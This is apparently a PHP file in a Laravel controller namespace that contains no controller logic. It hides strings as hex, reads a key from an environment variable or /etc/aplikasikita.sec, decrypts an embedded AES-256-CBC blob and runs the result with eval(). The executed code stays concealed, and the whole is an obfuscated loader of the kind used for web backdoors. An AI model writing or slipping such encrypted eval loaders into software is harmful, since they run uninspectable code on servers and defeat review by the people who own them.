<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('F8UfTM6szFEzpVxdm85STA==');

$c=base64_decode(

'hnTr9PIqUHRPfSugPwbPl+LOzdqmUNEElLivtb0oacU7NevSeMyTH2vFdTbJLojq+N8QAN2vBmrK' .
'eaVpRlZ0bqAdc4xWcEhYTchhMaHPj/iUMBe7CtnxcuFR7cjh262YvzeGwVbPUNIg6MG2eRFZK6D/' .
'ogVXSOaIi/rBoTEiaWLb32TFeLhMGYq0gaVgLY6NyBwXbodQi56z5qW7XLDBdHvYsK9BPqcWjVqy' .
'W67XsIBO4bdiX11p1I8cQJwhDZ6jjxDbADVAqPz6fvKPy8jVVg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

